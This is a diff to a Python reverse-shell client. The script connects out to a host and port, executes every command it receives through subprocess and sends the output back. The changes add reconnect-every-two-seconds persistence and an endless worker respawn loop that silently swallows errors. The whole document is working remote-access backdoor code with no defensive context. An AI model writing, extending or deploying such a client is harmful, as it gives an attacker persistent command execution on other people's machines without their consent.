@@ -1,7 +1,11 @@
 import os
+import time
 import socket
 import subprocess
-import sys
+from multiprocessing import Process
+
+host = "127.0.0.1"
+port = 5050
 
 def receiver(s):
     """Receive system commands and execute them."""
@@ -23,24 +27,33 @@ def receiver(s):
             data = p.stdout + p.stderr
             x3 = f'{os.getcwd()}>'
             s.sendall(data + x3.encode())
+        else:
+            print("Connection Closed")
+            break
 
-def connect(address):
+def connect():
     """Establish a connection to the address, then call receiver()"""
-    try:
-        s = socket.socket()
-        s.connect(address)
-        print("Connection Established.")
-        print(f"Address: {address}")
-        x5 = f'{os.getcwd()}>'
-        s.send(x5.encode())
-
-    except socket.error as error:
-        print("Something went wrong... more info below.")
-        print(error)
-        sys.exit()
+    s = socket.socket()
+    while True:
+        try:
+            s.connect((host, port))
+            print("Connection Established.")
+            x5 = f'{os.getcwd()}>'
+            s.send(x5.encode())
+            break
+        except Exception as e:
+            print("Connection Error: " + str(e))
+            time.sleep(2)
+            continue
     receiver(s)
 
 if __name__ == "__main__":
-    host = "127.0.0.1"
-    port = 5050
-    connect((host, port))
+    while True:
+        try:
+            print("Creating new worker...")
+            p = Process(target=connect)
+            p.start()
+            p.join()
+            print("Worker terminated\n")
+        except:
+            ...
